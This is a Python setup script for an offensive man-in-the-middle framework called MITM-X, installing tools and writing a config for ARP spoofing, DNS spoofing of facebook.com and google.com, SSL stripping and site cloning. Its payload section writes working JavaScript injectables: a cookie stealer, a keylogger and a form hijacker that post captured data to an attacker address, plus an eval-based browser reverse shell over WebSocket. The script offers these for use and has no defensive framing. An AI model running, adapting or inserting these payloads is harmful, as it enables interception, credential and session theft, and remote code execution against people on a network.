#!/usr/bin/env python3
"""
MITM-X Framework Setup Script with Virtual Environment Support
Automatically creates virtual environment, installs dependencies and configures the system
"""

import os
import sys
import subprocess
import json
import platform
import logging
import venv
from pathlib import Path

class MITMSetupVenv:
    """
    Setup class for MITM-X Framework with Virtual Environment support
    """
    
    def __init__(self):
        """
        Initialize setup
        """
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        
        # Check if running on supported OS
        self.os_name = platform.system().lower()
        self.is_windows = self.os_name == 'windows'
        self.is_linux = self.os_name == 'linux'
        self.is_kali = self.check_kali_linux()
        
        # Virtual environment setup
        self.project_root = Path(__file__).parent.absolute()
        self.venv_path = self.project_root / "venv"
        
        # Set paths based on OS
        if self.is_windows:
            self.venv_python = self.venv_path / "Scripts" / "python.exe"
            self.venv_pip = self.venv_path / "Scripts" / "pip.exe"
            self.venv_activate = self.venv_path / "Scripts" / "activate.bat"
        else:
            self.venv_python = self.venv_path / "bin" / "python"
            self.venv_pip = self.venv_path / "bin" / "pip"
            self.venv_activate = self.venv_path / "bin" / "activate"
        
        # Required packages
        self.python_packages = [
            'scapy==2.5.0',
            'netfilterqueue==1.1.0',
            'dnslib==0.9.23',
            'flask==2.3.3',
            'beautifulsoup4==4.12.2',
            'requests==2.31.0',
            'mitmproxy==10.1.1',
            'websockets==11.0.3',
            'colorama==0.4.6',
            'psutil==5.9.5',
            'pycryptodome==3.18.0'
        ]
        
        # System packages (Linux only)
        self.system_packages = [
            'python3-dev',
            'python3-pip',
            'python3-venv',
            'python3-netfilterqueue',
            'iptables',
            'iptables-persistent',
            'dsniff',
            'ettercap-text-only',
            'build-essential',
            'libnetfilter-queue-dev'
        ] if self.is_linux else []
    
    def check_kali_linux(self):
        """
        Check if running on Kali Linux
        
        Returns:
            bool: True if Kali Linux
        """
        if not self.is_linux:
            return False
            
        try:
            with open('/etc/os-release', 'r') as f:
                content = f.read()
                return 'kali' in content.lower()
        except:
            return False
    
    def check_root_privileges(self):
        """
        Check if running with root privileges (Linux only)
        
        Returns:
            bool: True if root or Windows
        """
        if self.is_windows:
            return True  # Skip root check on Windows
        return os.geteuid() == 0
    
    def run_command(self, command, shell=True, cwd=None):
        """
        Run system command
        
        Args:
            command (str/list): Command to run
            shell (bool): Use shell
            cwd (str): Working directory
            
        Returns:
            bool: True if successful
        """
        try:
            self.logger.info(f"Running: {command}")
            result = subprocess.run(command, shell=shell, capture_output=True, text=True, cwd=cwd)
            
            if result.returncode == 0:
                if result.stdout:
                    self.logger.debug(f"Output: {result.stdout}")
                return True
            else:
                self.logger.error(f"Command failed with code {result.returncode}")
                if result.stderr:
                    self.logger.error(f"Error: {result.stderr}")
                return False
        except Exception as e:
            self.logger.error(f"Error running command: {e}")
            return False
    
    def create_virtual_environment(self):
        """
        Create virtual environment
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Creating virtual environment...")
        
        if self.venv_path.exists():
            self.logger.info("Virtual environment already exists, removing old one...")
            if self.is_windows:
                self.run_command(f'rmdir /s /q "{self.venv_path}"')
            else:
                self.run_command(f'rm -rf "{self.venv_path}"')
        
        try:
            # Create virtual environment
            venv.create(self.venv_path, with_pip=True)
            self.logger.info(f"Virtual environment created at: {self.venv_path}")
            
            # Verify creation
            if not self.venv_python.exists():
                self.logger.error("Failed to create virtual environment")
                return False
                
            return True
        except Exception as e:
            self.logger.error(f"Error creating virtual environment: {e}")
            return False
    
    def update_system(self):
        """
        Update system packages (Linux only)
        
        Returns:
            bool: True if successful
        """
        if not self.is_linux:
            self.logger.info("Skipping system update on Windows")
            return True
            
        self.logger.info("Updating system packages...")
        return self.run_command("apt update && apt upgrade -y")
    
    def install_system_packages(self):
        """
        Install required system packages (Linux only)
        
        Returns:
            bool: True if successful
        """
        if not self.is_linux:
            self.logger.info("Skipping system packages on Windows")
            return True
            
        self.logger.info("Installing system packages...")
        
        # Install packages one by one for better error handling
        for package in self.system_packages:
            success = self.run_command(f"apt install -y {package}")
            if not success:
                self.logger.warning(f"Failed to install {package}, continuing...")
        
        return True
    
    def install_python_packages(self):
        """
        Install required Python packages in virtual environment
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Installing Python packages in virtual environment...")
        
        # Upgrade pip first
        pip_upgrade_cmd = f'"{self.venv_pip}" install --upgrade pip'
        self.run_command(pip_upgrade_cmd)
        
        # Install packages
        failed_packages = []
        for package in self.python_packages:
            install_cmd = f'"{self.venv_pip}" install {package}'
            success = self.run_command(install_cmd)
            if not success:
                failed_packages.append(package)
                self.logger.warning(f"Failed to install {package}")
        
        if failed_packages:
            self.logger.warning(f"Failed to install: {', '.join(failed_packages)}")
            self.logger.info("You may need to install these manually later")
        
        return True
    
    def setup_directories(self):
        """
        Create necessary directories
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Setting up directories...")
        
        directories = [
            'logs',
            'cloned_sites',
            'payloads',
            'config'
        ]
        
        for directory in directories:
            try:
                dir_path = self.project_root / directory
                dir_path.mkdir(exist_ok=True)
                self.logger.debug(f"Created directory: {dir_path}")
            except Exception as e:
                self.logger.error(f"Error creating directory {directory}: {e}")
                return False
        
        return True
    
    def setup_ip_forwarding(self):
        """
        Enable IP forwarding (Linux only)
        
        Returns:
            bool: True if successful
        """
        if not self.is_linux:
            self.logger.info("IP forwarding setup skipped on Windows")
            return True
            
        self.logger.info("Enabling IP forwarding...")
        
        # Enable IP forwarding temporarily
        success1 = self.run_command("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        # Make it permanent
        try:
            sysctl_conf = "/etc/sysctl.conf"
            with open(sysctl_conf, "r") as f:
                content = f.read()
            
            if "net.ipv4.ip_forward=1" not in content:
                with open(sysctl_conf, "a") as f:
                    f.write("\n# Enable IP forwarding for MITM-X\nnet.ipv4.ip_forward=1\n")
                self.logger.info("Added IP forwarding to sysctl.conf")
        except Exception as e:
            self.logger.warning(f"Could not modify sysctl.conf: {e}")
        
        return success1
    
    def create_default_payloads(self):
        """
        Create default payload files
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Creating default payload files...")
        
        payloads = {
            'alert.js': 'alert("MITM-X: This page has been compromised!");',
            'cookie_stealer.js': '''
// Cookie Stealer Payload
(function() {
    var cookies = document.cookie;
    if (cookies) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://192.168.1.100:8080/cookies', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            url: window.location.href,
            cookies: cookies,
            timestamp: new Date().toISOString()
        }));
    }
})();
            ''',
            'keylogger.js': '''
// Keylogger Payload
(function() {
    var keys = [];
    var sendData = function() {
        if (keys.length > 0) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://192.168.1.100:8080/keys', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                url: window.location.href,
                keys: keys.join(''),
                timestamp: new Date().toISOString()
            }));
            keys = [];
        }
    };
    
    document.addEventListener('keypress', function(e) {
        keys.push(String.fromCharCode(e.which));
        if (keys.length > 50) {
            sendData();
        }
    });
    
    // Send data every 30 seconds
    setInterval(sendData, 30000);
})();
            ''',
            'form_hijacker.js': '''
// Form Hijacker Payload
(function() {
    document.addEventListener('DOMContentLoaded', function() {
        var forms = document.getElementsByTagName('form');
        for (var i = 0; i < forms.length; i++) {
            forms[i].addEventListener('submit', function(e) {
                var formData = new FormData(this);
                var data = {
                    url: window.location.href,
                    form_action: this.action,
                    form_method: this.method,
                    timestamp: new Date().toISOString(),
                    fields: {}
                };
                
                for (var pair of formData.entries()) {
                    data.fields[pair[0]] = pair[1];
                }
                
                // Send form data to attacker server
                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'http://192.168.1.100:8080/forms', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify(data));
            });
        }
    });
})();
            ''',
            'reverse_shell.js': '''
// Reverse Shell Payload (Browser-based)
(function() {
    var ws;
    var connect = function() {
        try {
            ws = new WebSocket('ws://192.168.1.100:8081');
            
            ws.onopen = function() {
                ws.send(JSON.stringify({
                    type: 'connect',
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                }));
            };
            
            ws.onmessage = function(event) {
                try {
                    var command = JSON.parse(event.data);
                    if (command.type === 'eval') {
                        var result = eval(command.code);
                        ws.send(JSON.stringify({
                            type: 'result',
                            result: String(result),
                            timestamp: new Date().toISOString()
                        }));
                    }
                } catch (e) {
                    ws.send(JSON.stringify({
                        type: 'error',
                        error: e.toString(),
                        timestamp: new Date().toISOString()
                    }));
                }
            };
            
            ws.onclose = function() {
                setTimeout(connect, 5000); // Reconnect after 5 seconds
            };
        } catch (e) {
            setTimeout(connect, 5000);
        }
    };
    
    connect();
})();
            '''
        }
        
        try:
            payloads_dir = self.project_root / "payloads"
            for filename, content in payloads.items():
                file_path = payloads_dir / filename
                with open(file_path, 'w') as f:
                    f.write(content)
                self.logger.debug(f"Created payload: {filename}")
            return True
        except Exception as e:
            self.logger.error(f"Error creating payloads: {e}")
            return False
    
    def create_config_file(self):
        """
        Create default configuration file
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Creating configuration file...")
        
        config = {
            "interface": "eth0" if self.is_linux else "Wi-Fi",
            "gateway": "192.168.1.1",
            "dns_server": "8.8.8.8",
            "dashboard_port": 5000,
            "proxy_port": 8080,
            "log_level": "INFO",
            "virtual_env": {
                "enabled": True,
                "path": str(self.venv_path),
                "python_executable": str(self.venv_python)
            },
            "arp_spoof": {
                "enabled": False,
                "target_ip": "",
                "gateway_ip": "",
                "interface": "eth0" if self.is_linux else "Wi-Fi"
            },
            "dns_spoof": {
                "enabled": False,
                "domains": {
                    "facebook.com": "192.168.1.100",
                    "google.com": "192.168.1.100"
                },
                "redirect_ip": "192.168.1.100"
            },
            "packet_sniffer": {
                "enabled": False,
                "interface": "eth0" if self.is_linux else "Wi-Fi",
                "log_file": "logs/packets.log"
            },
            "ssl_strip": {
                "enabled": False,
                "port": 8080,
                "hsts_bypass": True
            },
            "payload_injector": {
                "enabled": False,
                "port": 8080,
                "payload_file": "payloads/alert.js"
            },
            "web_cloner": {
                "enabled": False,
                "output_dir": "cloned_sites/",
                "server_port": 8000
            },
            "dashboard": {
                "enabled": True,
                "port": 5000,
                "host": "0.0.0.0"
            }
        }
        
        try:
            config_path = self.project_root / "config" / "settings.json"
            with open(config_path, 'w') as f:
                json.dump(config, f, indent=4)
            self.logger.info(f"Configuration saved to: {config_path}")
            return True
        except Exception as e:
            self.logger.error(f"Error creating config file: {e}")
            return False
    
    def test_dependencies(self):
        """
        Test if all dependencies are working in virtual environment
        
        Returns:
            bool: True if all tests pass
        """
        self.logger.info("Testing dependencies in virtual environment...")
        
        tests = [
            ('scapy', 'from scapy.all import *'),
            ('requests', 'import requests'),
            ('beautifulsoup4', 'from bs4 import BeautifulSoup'),
            ('flask', 'from flask import Flask'),
            ('psutil', 'import psutil'),
            ('colorama', 'import colorama'),
            ('websockets', 'import websockets'),
        ]
        
        all_passed = True
        
        for name, import_test in tests:
            test_cmd = f'"{self.venv_python}" -c "{import_test}"'
            success = self.run_command(test_cmd)
            if success:
                self.logger.info(f"✓ {name} - OK")
            else:
                self.logger.error(f"✗ {name} - FAILED")
                all_passed = False
        
        # Test Linux-specific packages
        if self.is_linux:
            linux_tests = [
                ('netfilterqueue', 'import netfilterqueue'),
                ('dnslib', 'import dnslib'),
            ]
            
            for name, import_test in linux_tests:
                test_cmd = f'"{self.venv_python}" -c "{import_test}"'
                success = self.run_command(test_cmd)
                if success:
                    self.logger.info(f"✓ {name} - OK")
                else:
                    self.logger.warning(f"✗ {name} - FAILED (Linux-specific)")
        
        return all_passed
    
    def create_activation_scripts(self):
        """
        Create convenience scripts for activating the environment
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Creating activation scripts...")
        
        try:
            if self.is_windows:
                # Create Windows batch file
                batch_content = f'''@echo off
echo Activating MITM-X Virtual Environment...
call "{self.venv_activate}"
echo Virtual environment activated!
echo You can now run: python mitm_x.py
cmd /k
'''
                batch_path = self.project_root / "activate_mitm.bat"
                with open(batch_path, 'w') as f:
                    f.write(batch_content)
                self.logger.info(f"Created Windows activation script: {batch_path}")
                
                # Create PowerShell script
                ps_content = f'''Write-Host "Activating MITM-X Virtual Environment..." -ForegroundColor Green
& "{self.venv_activate}"
Write-Host "Virtual environment activated!" -ForegroundColor Green
Write-Host "You can now run: python mitm_x.py" -ForegroundColor Yellow
'''
                ps_path = self.project_root / "activate_mitm.ps1"
                with open(ps_path, 'w') as f:
                    f.write(ps_content)
                self.logger.info(f"Created PowerShell activation script: {ps_path}")
            
            else:
                # Create Linux shell script
                shell_content = f'''#!/bin/bash
echo "Activating MITM-X Virtual Environment..."
source "{self.venv_activate}"
echo "Virtual environment activated!"
echo "You can now run: python3 mitm_x.py"
exec bash
'''
                shell_path = self.project_root / "activate_mitm.sh"
                with open(shell_path, 'w') as f:
                    f.write(shell_content)
                
                # Make executable
                self.run_command(f"chmod +x {shell_path}")
                self.logger.info(f"Created Linux activation script: {shell_path}")
            
            return True
        except Exception as e:
            self.logger.error(f"Error creating activation scripts: {e}")
            return False
    
    def run_setup(self):
        """
        Run complete setup process
        
        Returns:
            bool: True if setup successful
        """
        self.logger.info("Starting MITM-X Framework setup with virtual environment...")
        
        # Check root privileges (Linux only)
        if self.is_linux and not self.check_root_privileges():
            self.logger.error("This script must be run with sudo privileges on Linux")
            self.logger.info("Please run: sudo python3 setup_venv.py")
            return False
        
        # Display system info
        self.logger.info(f"Detected OS: {self.os_name}")
        if self.is_kali:
            self.logger.info("Kali Linux detected - full feature support")
        elif self.is_linux:
            self.logger.info("Linux detected - most features supported")
        else:
            self.logger.info("Windows detected - limited feature support")
        
        # Run setup steps
        steps = [
            ("Setting up directories", self.setup_directories),
            ("Creating virtual environment", self.create_virtual_environment),
        ]
        
        # Add Linux-specific steps
        if self.is_linux:
            steps.extend([
                ("Updating system", self.update_system),
                ("Installing system packages", self.install_system_packages),
            ])
        
        steps.extend([
            ("Installing Python packages", self.install_python_packages),
            ("Creating default payloads", self.create_default_payloads),
            ("Creating configuration", self.create_config_file),
            ("Creating activation scripts", self.create_activation_scripts),
            ("Testing dependencies", self.test_dependencies),
        ])
        
        # Add Linux-specific step
        if self.is_linux:
            steps.append(("Setting up IP forwarding", self.setup_ip_forwarding))
        
        for step_name, step_function in steps:
            self.logger.info(f"\n--- {step_name} ---")
            success = step_function()
            if not success:
                self.logger.error(f"Step failed: {step_name}")
                return False
        
        self.print_completion_info()
        return True
    
    def print_completion_info(self):
        """
        Print completion information and usage instructions
        """
        self.logger.info("\n" + "="*50)
        self.logger.info("MITM-X Framework Setup Complete!")
        self.logger.info("="*50)
        
        if self.is_windows:
            self.logger.info("\nTo activate the virtual environment:")
            self.logger.info("  Option 1: Double-click 'activate_mitm.bat'")
            self.logger.info("  Option 2: Run 'activate_mitm.ps1' in PowerShell")
            self.logger.info(f"  Option 3: Manual activation:")
            self.logger.info(f"    {self.venv_activate}")
            self.logger.info("\nAfter activation, run:")
            self.logger.info("  python mitm_x.py")
        else:
            self.logger.info("\nTo activate the virtual environment:")
            self.logger.info("  Option 1: ./activate_mitm.sh")
            self.logger.info(f"  Option 2: source {self.venv_activate}")
            self.logger.info("\nAfter activation, run:")
            self.logger.info("  sudo python3 mitm_x.py")
        
        self.logger.info(f"\nVirtual environment location: {self.venv_path}")
        self.logger.info("Dashboard will be available at: http://localhost:5000")
        self.logger.info("\nConfiguration file: config/settings.json")
        
        if self.is_windows:
            self.logger.info("\nNote: Some features may be limited on Windows")
            self.logger.info("For full functionality, use Kali Linux or similar")

def main():
    """
    Main function
    """
    print("MITM-X Framework Setup with Virtual Environment")
    print("=" * 50)
    print()
    
    setup = MITMSetupVenv()
    
    try:
        success = setup.run_setup()
        if success:
            print("\n✓ Setup completed successfully!")
            sys.exit(0)
        else:
            print("\n✗ Setup failed!")
            sys.exit(1)
    except KeyboardInterrupt:
        print("\nSetup interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\nUnexpected error during setup: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
